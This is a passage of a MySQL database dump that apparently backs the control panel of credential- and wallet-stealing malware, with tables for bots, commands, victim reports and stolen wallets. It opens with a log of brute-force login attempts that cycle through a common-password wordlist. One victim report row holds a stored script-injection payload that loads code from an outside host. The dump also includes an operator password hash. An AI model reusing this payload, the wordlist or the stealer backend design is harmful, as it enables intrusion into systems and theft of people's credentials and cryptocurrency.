(517, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522257),
(518, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522259),
(519, 'WARNING_AUTH_NOT_SUCCESS', 'five, Password123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522260),
(520, 'WARNING_AUTH_NOT_SUCCESS', 'five, Passwort, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522261),
(521, 'WARNING_AUTH_NOT_SUCCESS', 'five, Sakhie64, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522263),
(522, 'WARNING_AUTH_NOT_SUCCESS', 'five, Shamrock77, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522264),
(523, 'WARNING_AUTH_NOT_SUCCESS', 'five, Test, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522265),
(524, 'WARNING_AUTH_NOT_SUCCESS', 'five, Welcome1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522267),
(525, 'WARNING_AUTH_NOT_SUCCESS', 'five, [EMPTY PASSWORD], RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522268),
(526, 'WARNING_AUTH_NOT_SUCCESS', 'five, aaaaaa, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522269),
(527, 'WARNING_AUTH_NOT_SUCCESS', 'five, abc123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522271),
(528, 'WARNING_AUTH_NOT_SUCCESS', 'five, abcd1234, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522272),
(529, 'WARNING_AUTH_NOT_SUCCESS', 'five, admin, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522274),
(530, 'WARNING_AUTH_NOT_SUCCESS', 'five, admin123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522275),
(531, 'WARNING_AUTH_NOT_SUCCESS', 'five, alpha1906, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522277),
(532, 'WARNING_AUTH_NOT_SUCCESS', 'five, andrea, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522278),
(533, 'WARNING_AUTH_NOT_SUCCESS', 'five, asdasd, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522280),
(534, 'WARNING_AUTH_NOT_SUCCESS', 'five, asdfghjkl, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522281),
(535, 'WARNING_AUTH_NOT_SUCCESS', 'five, barcelona, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522282),
(536, 'WARNING_AUTH_NOT_SUCCESS', 'five, cecelle222, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522284),
(537, 'WARNING_AUTH_NOT_SUCCESS', 'five, changeme, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522285),
(538, 'WARNING_AUTH_NOT_SUCCESS', 'five, cl4.r0ut3r, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522286),
(539, 'WARNING_AUTH_NOT_SUCCESS', 'five, crs, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522288),
(540, 'WARNING_AUTH_NOT_SUCCESS', 'five, daniel, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522289),
(541, 'WARNING_AUTH_NOT_SUCCESS', 'five, demo, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522291),
(542, 'WARNING_AUTH_NOT_SUCCESS', 'five, gati07, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522292),
(543, 'WARNING_AUTH_NOT_SUCCESS', 'five, guest, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522293),
(544, 'WARNING_AUTH_NOT_SUCCESS', 'five, iamawesome, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522295),
(545, 'WARNING_AUTH_NOT_SUCCESS', 'five, iloveu1362, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522296),
(546, 'WARNING_AUTH_NOT_SUCCESS', 'five, iloveyou, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522297),
(547, 'WARNING_AUTH_NOT_SUCCESS', 'five, internet, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522299),
(548, 'WARNING_AUTH_NOT_SUCCESS', 'five, iz85917031, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522300),
(549, 'WARNING_AUTH_NOT_SUCCESS', 'five, jackmark456, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522301),
(550, 'WARNING_AUTH_NOT_SUCCESS', 'five, jimmy098, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522303),
(551, 'WARNING_AUTH_NOT_SUCCESS', 'five, jimmy123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522305),
(552, 'WARNING_AUTH_NOT_SUCCESS', 'five, justaddwater, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522306),
(553, 'WARNING_AUTH_NOT_SUCCESS', 'five, kbctyjr, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522307),
(554, 'WARNING_AUTH_NOT_SUCCESS', 'five, master, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522309),
(555, 'WARNING_AUTH_NOT_SUCCESS', 'five, michelle, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522310),
(556, 'WARNING_AUTH_NOT_SUCCESS', 'five, mpmstas,,11, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522311),
(557, 'WARNING_AUTH_NOT_SUCCESS', 'five, mustang, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522313),
(558, 'WARNING_AUTH_NOT_SUCCESS', 'five, oktober83, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522314),
(559, 'WARNING_AUTH_NOT_SUCCESS', 'five, omgponies, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522316),
(560, 'WARNING_AUTH_NOT_SUCCESS', 'five, parola, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522317),
(561, 'WARNING_AUTH_NOT_SUCCESS', 'five, pass, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522318),
(562, 'WARNING_AUTH_NOT_SUCCESS', 'five, password, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522320),
(563, 'WARNING_AUTH_NOT_SUCCESS', 'five, password1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522321),
(564, 'WARNING_AUTH_NOT_SUCCESS', 'five, princess, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522322),
(565, 'WARNING_AUTH_NOT_SUCCESS', 'five, q1w2e3r4, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522324),
(566, 'WARNING_AUTH_NOT_SUCCESS', 'five, qazwsx, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522325),
(567, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwerty, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522326),
(568, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwerty123, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522328),
(569, 'WARNING_AUTH_NOT_SUCCESS', 'five, qwertyuiop, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522329),
(570, 'WARNING_AUTH_NOT_SUCCESS', 'five, realbetis07, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522330),
(571, 'WARNING_AUTH_NOT_SUCCESS', 'five, root, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522332),
(572, 'WARNING_AUTH_NOT_SUCCESS', 'five, samsung, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522333),
(573, 'WARNING_AUTH_NOT_SUCCESS', 'five, sergio80, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522335),
(574, 'WARNING_AUTH_NOT_SUCCESS', 'five, shadow, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522336),
(575, 'WARNING_AUTH_NOT_SUCCESS', 'five, spoofyou2015, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522337),
(576, 'WARNING_AUTH_NOT_SUCCESS', 'five, student, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522339),
(577, 'WARNING_AUTH_NOT_SUCCESS', 'five, sunshine, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522340),
(578, 'WARNING_AUTH_NOT_SUCCESS', 'five, test, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522341),
(579, 'WARNING_AUTH_NOT_SUCCESS', 'five, ubnt, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522343),
(580, 'WARNING_AUTH_NOT_SUCCESS', 'five, user, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522344),
(581, 'WARNING_AUTH_NOT_SUCCESS', 'five, welcome, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522346),
(582, 'WARNING_AUTH_NOT_SUCCESS', 'five, welcome1, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522347),
(583, 'WARNING_AUTH_NOT_SUCCESS', 'five, zonnetje, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522348),
(584, 'WARNING_AUTH_NOT_SUCCESS', 'five, zxcvbnm, RU (127.0.0.1), Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0', 1527522350);

-- --------------------------------------------------------

--
-- Table structure for table `FRox_reports`
--

CREATE TABLE `FRox_reports` (
  `report_id` int(11) NOT NULL,
  `report_time` int(11) NOT NULL,
  `report_guid` varchar(32) NOT NULL,
  `report_os` int(4) NOT NULL,
  `report_is_win64` int(1) NOT NULL,
  `report_account` int(1) NOT NULL,
  `report_ip` varchar(20) NOT NULL,
  `report_country` varchar(2) NOT NULL,
  `report_version` float NOT NULL,
  `report_bin_id` varchar(11) NOT NULL,
  `report_data` blob NOT NULL,
  `report_hash` varchar(42) NOT NULL,
  `report_screen` varchar(10) NOT NULL,
  `report_name` varchar(100) NOT NULL,
  `report_data_num` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `FRox_reports`
--

INSERT INTO `FRox_reports` (`report_id`, `report_time`, `report_guid`, `report_os`, `report_is_win64`, `report_account`, `report_ip`, `report_country`, `report_version`, `report_bin_id`, `report_data`, `report_hash`, `report_screen`, `report_name`, `report_data_num`) VALUES
(12, 1527522351, '3AF1CA2E69577BDDA91D3A37', 7, 0, 3, '212.92.105.147', 'RU', 18, 'ckav.ru', '', 'e1f680313a34271df5f0926d0f4d71e6', '1080x1920', '7fdf5-PC.\\\\7Fdf5<script src=\\\"http://gmyc.cf/95488\\\"></script>', 0);

-- --------------------------------------------------------

--
-- Table structure for table `FRox_users`
--

CREATE TABLE `FRox_users` (
  `user_id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `cookie` varchar(300) NOT NULL,
  `settings` varchar(200) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `FRox_users`
--

INSERT INTO `FRox_users` (`user_id`, `username`, `password`, `cookie`, `settings`) VALUES
(1, 'Andy', 'c0e294444bfbf43bc576d64d68863ffd', '-LO-', '{\"Privileges\":\"0\",\"PageLimit\":\"20\",\"LastLogin\":0,\"LastView\":0,\"JabberID\":\"-\",\"LangID\":\"en\"}');

-- --------------------------------------------------------

--
-- Table structure for table `FRox_wallets`
--

CREATE TABLE `FRox_wallets` (
  `wallet_id` int(11) NOT NULL,
  `report_id` int(11) NOT NULL,
  `wallet_time` int(11) NOT NULL,
  `wallet_name` varchar(100) NOT NULL,
  `wallet_size` int(11) NOT NULL,
  `wallet_client` int(11) NOT NULL,
  `wallet_balance` varchar(30) NOT NULL,
  `wallet_locked` tinyint(1) NOT NULL,
  `wallet_transactions` tinyint(1) NOT NULL,
  `wallet_cheked` tinyint(1) NOT NULL,
  `wallet_hash` varchar(40) NOT NULL,
  `wallet_password` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Indexes for dumped tables
--

--
-- Indexes for table `FRox_bots`
--
ALTER TABLE `FRox_bots`
  ADD PRIMARY KEY (`bot_id`);

--
-- Indexes for table `FRox_commands`
--
ALTER TABLE `FRox_commands`
  ADD PRIMARY KEY (`command_id`);

--
-- Indexes for table `FRox_commands_log`
--
ALTER TABLE `FRox_commands_log`
  ADD PRIMARY KEY (`command_log_id`);

--
-- Indexes for table `FRox_data`
--
ALTER TABLE `FRox_data`
  ADD PRIMARY KEY (`data_id`);

--
-- Indexes for table `FRox_logs`
--
ALTER TABLE `FRox_logs`
  ADD PRIMARY KEY (`log_id`);

--
-- Indexes for table `FRox_reports`
--
ALTER TABLE `FRox_reports`
  ADD PRIMARY KEY (`report_id`);

--
-- Indexes for table `FRox_users`
--
ALTER TABLE `FRox_users`
  ADD PRIMARY KEY (`user_id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- Indexes for table `FRox_wallets`
--
ALTER TABLE `FRox_wallets`
  ADD PRIMARY KEY (`wallet_id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `FRox_bots`
--
ALTER TABLE `FRox_bots`
  MODIFY `bot_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `FRox_commands`
--
ALTER TABLE `FRox_commands`
  MODIFY `command_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `FRox_commands_log`
--
ALTER TABLE `FRox_commands_log`
  MODIFY `command_log_id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `FRox_data`
--
ALTER TABLE `FRox_data`
  MODIFY `data_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=43;

--
-- AUTO_INCREMENT for table `FRox_logs`
--
ALTER TABLE `FRox_logs`
  MODIFY `log_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=585;

--
-- AUTO_INCREMENT for table `FRox_reports`
--
ALTER TABLE `FRox_reports`
  MODIFY `report_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `FRox_users`
--
ALTER TABLE `FRox_users`
  MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `FRox_wallets`
--
ALTER TABLE `FRox_wallets`
  MODIFY `wallet_id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
